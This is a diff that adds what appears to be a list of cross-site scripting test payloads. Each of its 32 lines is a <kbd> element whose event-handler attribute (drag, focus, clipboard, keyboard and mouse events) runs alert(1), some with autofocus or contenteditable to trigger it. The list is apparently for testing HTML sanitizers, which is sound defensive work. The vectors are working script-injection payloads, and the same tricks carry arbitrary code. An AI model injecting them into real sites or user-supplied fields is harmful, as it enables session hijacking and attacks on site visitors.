@@ -1,0 +1,32 @@
+<kbd draggable="true" ondrag="alert(1)">test</kbd>
+<kbd draggable="true" ondragend="alert(1)">test</kbd>
+<kbd draggable="true" ondragenter="alert(1)">test</kbd>
+<kbd draggable="true" ondragleave="alert(1)">test</kbd>
+<kbd draggable="true" ondragstart="alert(1)">test</kbd>
+<kbd id=x tabindex=1 onactivate=alert(1)></kbd>
+<kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>
+<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>
+<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>
+<kbd id=x tabindex=1 onfocus=alert(1)></kbd>
+<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
+<kbd onbeforecopy="alert(1)" contenteditable>test</kbd>
+<kbd onbeforecut="alert(1)" contenteditable>test</kbd>
+<kbd onbeforepaste="alert(1)" contenteditable>test</kbd>
+<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>
+<kbd onclick="alert(1)">test</kbd>
+<kbd oncontextmenu="alert(1)">test</kbd>
+<kbd oncopy="alert(1)" contenteditable>test</kbd>
+<kbd oncut="alert(1)" contenteditable>test</kbd>
+<kbd ondblclick="alert(1)">test</kbd>
+<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>
+<kbd onkeydown="alert(1)" contenteditable>test</kbd>
+<kbd onkeypress="alert(1)" contenteditable>test</kbd>
+<kbd onkeyup="alert(1)" contenteditable>test</kbd>
+<kbd onmousedown="alert(1)">test</kbd>
+<kbd onmouseenter="alert(1)">test</kbd>
+<kbd onmouseleave="alert(1)">test</kbd>
+<kbd onmousemove="alert(1)">test</kbd>
+<kbd onmouseout="alert(1)">test</kbd>
+<kbd onmouseover="alert(1)">test</kbd>
+<kbd onmouseup="alert(1)">test</kbd>
+<kbd onpaste="alert(1)" contenteditable>test</kbd>
